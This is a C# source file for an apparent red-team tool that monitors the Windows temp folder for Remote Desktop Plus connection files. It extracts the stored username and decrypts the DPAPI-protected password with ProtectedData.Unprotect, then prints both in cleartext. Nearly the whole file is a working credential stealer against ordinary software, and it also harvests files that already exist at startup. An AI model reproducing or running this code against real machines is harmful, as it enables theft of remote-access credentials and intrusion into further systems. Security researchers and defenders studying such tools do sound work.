using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Threading;

class Program
{
    private static Dictionary<string, bool> processedFiles = new Dictionary<string, bool>();
    private static string appDataTempPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");

    static void Main(string[] args)
    {
        DisplayBanner();
        Console.WriteLine("[+] Checking for artifact .tmp files in application data.");
        ProcessExistingFiles();
        FileSystemWatcher watcher = SetupFileSystemWatcher();
        Console.WriteLine($"[+] Monitoring for new Remote Desktop Plus Connections. Press Enter to quit.");
        while (Console.ReadLine() != "q")
        {
            Thread.Sleep(1000);
        }
    }

    private static FileSystemWatcher SetupFileSystemWatcher()
    {
        FileSystemWatcher watcher = new FileSystemWatcher
        {
            Path = appDataTempPath,
            Filter = "Remote Desktop Plus.*.tmp",
            IncludeSubdirectories = false,
            NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite,
            EnableRaisingEvents = true
        };
        watcher.Created += OnCreated;
        return watcher;
    }

    private static void OnCreated(object sender, FileSystemEventArgs e)
    {
        ThreadPool.QueueUserWorkItem(_ => {
            string tempFilePath = null;
            try
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".tmp");
                File.Copy(e.FullPath, tempFilePath, overwrite: true);
                if (File.Exists(tempFilePath))
                {
                    Console.WriteLine($"[File Copied for Processing]: {tempFilePath}");
                    ProcessFile(tempFilePath);
                    File.Delete(tempFilePath);
                }
            }
            catch (IOException ioEx)
            {
                Console.WriteLine($"[Error Copying File]: {ioEx.Message}. File: {e.FullPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Error Processing File]: {ex.Message}. File: {e.FullPath}");
            }
            finally
            {
                if (tempFilePath != null && File.Exists(tempFilePath))
                {
                    try
                    {
                        File.Delete(tempFilePath);
                    }
                    catch (IOException)
                    {
                        Console.WriteLine($"[Error Cleaning Up Temporary File]: {tempFilePath}. It might be locked or in use.");
                    }
                }
            }
        });
    }

    private static void ProcessExistingFiles()
    {
        foreach (var filePath in Directory.GetFiles(appDataTempPath, "Remote Desktop Plus.*.tmp", SearchOption.TopDirectoryOnly))
        {
            ProcessFile(filePath);
        }
    }

    private static void ProcessFile(string filePath)
    {
        if (processedFiles.ContainsKey(filePath)) return;
        processedFiles[filePath] = false;
        try
        {
            var fileContent = File.ReadAllLines(filePath);
            var usernameLine = Array.Find(fileContent, line => line.StartsWith("username:s:"));
            var username = usernameLine?.Substring("username:s:".Length);
            var passwordLine = Array.Find(fileContent, line => line.StartsWith("password 51:b:"));
            var passwordEncryptedAsHex = passwordLine?.Substring("password 51:b:".Length);
            var decryptedPassword = DecryptPassword(passwordEncryptedAsHex);
            Console.WriteLine($"[Credentials Found]: {filePath}");
            Console.WriteLine("┌───────────────────────────────────────┐");
            Console.WriteLine($"│ Username: {username.PadRight(28)}│");
            Console.WriteLine($"│ Password: {decryptedPassword.PadRight(28)}│");
            Console.WriteLine("└───────────────────────────────────────┘");
            processedFiles[filePath] = true;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Error Processing]: {filePath} - {ex.Message}");
        }
    }

    private static string DecryptPassword(string passwordEncryptedAsHex)
    {
        var passwordEncryptedAsBytes = Enumerable.Range(0, passwordEncryptedAsHex.Length / 2)
            .Select(x => Convert.ToByte(passwordEncryptedAsHex.Substring(x * 2, 2), 16))
            .ToArray();
        var passwordAsBytes = ProtectedData.Unprotect(passwordEncryptedAsBytes, null, DataProtectionScope.CurrentUser);
        return Encoding.Unicode.GetString(passwordAsBytes);
    }

    private static void DisplayBanner()
    {
        string banner = @"╔═╗┬ ┬┌─┐┬─┐┌─┐╦═╗╔╦╗╔═╗┬  ┬ ┬┌─┐╔═╗┌┐┌┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐
╚═╗├─┤├─┤├┬┘├─┘╠╦╝ ║║╠═╝│  │ │└─┐╚═╗│││├─┤ │ │  ├─┤├┤ ├┬┘
╚═╝┴ ┴┴ ┴┴└─┴  ╩╚══╩╝╩  ┴─┘└─┘└─┘╚═╝┘└┘┴ ┴ ┴ └─┘┴ ┴└─┘┴└─";
        Console.WriteLine(banner + "\n");
    }
}